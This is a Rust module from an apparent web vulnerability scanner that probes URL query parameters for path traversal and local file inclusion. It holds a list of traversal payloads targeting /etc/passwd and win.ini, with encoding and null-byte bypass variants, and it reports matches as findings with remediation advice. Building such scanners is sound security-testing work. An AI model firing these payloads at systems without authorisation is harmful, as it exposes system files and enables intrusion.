//! Path Traversal / Local File Inclusion testing

use anyhow::Result;

use crate::http::{HttpClient, Request};
use crate::scanner::findings::{Finding, Severity};

/// Path traversal payloads
const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "....//....//....//....//etc/passwd",
    "..././..././..././etc/passwd",
    "/etc/passwd",
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
    "file:///etc/passwd",
];

/// Linux file indicators
const LINUX_FILE_INDICATORS: &[&str] = &[
    "root:x:0:0:",
    "daemon:x:1:1:",
    "bin:x:2:2:",
    "/bin/bash",
    "/bin/sh",
];

/// Windows file indicators
const WINDOWS_FILE_INDICATORS: &[&str] = &[
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
    "[files]",
    "[Mail]",
];

/// Scan for path traversal vulnerabilities
pub async fn scan(client: &HttpClient, target_url: &str) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let url = url::Url::parse(target_url)?;
    let params: Vec<(String, String)> = url.query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();

    // Also check the path segments
    let path = url.path();
    let has_file_param = params.iter().any(|(k, v)| {
        let k_lower = k.to_lowercase();
        let v_lower = v.to_lowercase();
        k_lower.contains("file") || k_lower.contains("path") || k_lower.contains("page")
            || k_lower.contains("doc") || k_lower.contains("include")
            || v_lower.ends_with(".php") || v_lower.ends_with(".html") || v_lower.ends_with(".txt")
    });

    if params.is_empty() && !has_file_param {
        return Ok(findings);
    }

    for (param_name, _) in &params {
        for payload in PATH_TRAVERSAL_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        pairs.append_pair(k, payload);
                    } else {
                        pairs.append_pair(k, v);
                    }
                }
            }

            let request = Request::new("GET", test_url.as_str());
            let response = match client.execute(&request).await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = response.body_text();

            // Check for Linux file content
            for indicator in LINUX_FILE_INDICATORS {
                if body.contains(indicator) {
                    findings.push(
                        Finding::new("Path Traversal / LFI", Severity::High, target_url)
                            .with_description(&format!(
                                "Path traversal vulnerability detected in parameter '{}'. Linux system file content leaked.",
                                param_name
                            ))
                            .with_parameter(param_name)
                            .with_evidence(&format!("Payload: {}, Indicator: {}", payload, indicator))
                            .with_scanner("active/path-traversal")
                            .with_cwe(22)
                            .with_owasp("A01:2021 – Broken Access Control")
                            .with_remediation(
                                "Validate and sanitize file paths. Use a whitelist of allowed files. Never use user input directly in file paths."
                            )
                            .with_request(&format!("GET {}", test_url)),
                    );
                    break;
                }
            }

            // Check for Windows file content
            for indicator in WINDOWS_FILE_INDICATORS {
                if body.contains(indicator) {
                    findings.push(
                        Finding::new("Path Traversal / LFI", Severity::High, target_url)
                            .with_description(&format!(
                                "Path traversal vulnerability detected in parameter '{}'. Windows system file content leaked.",
                                param_name
                            ))
                            .with_parameter(param_name)
                            .with_evidence(&format!("Payload: {}, Indicator: {}", payload, indicator))
                            .with_scanner("active/path-traversal")
                            .with_cwe(22)
                            .with_owasp("A01:2021 – Broken Access Control")
                            .with_remediation(
                                "Validate and sanitize file paths. Use a whitelist of allowed files."
                            )
                            .with_request(&format!("GET {}", test_url)),
                    );
                    break;
                }
            }
        }
    }

    Ok(findings)
}
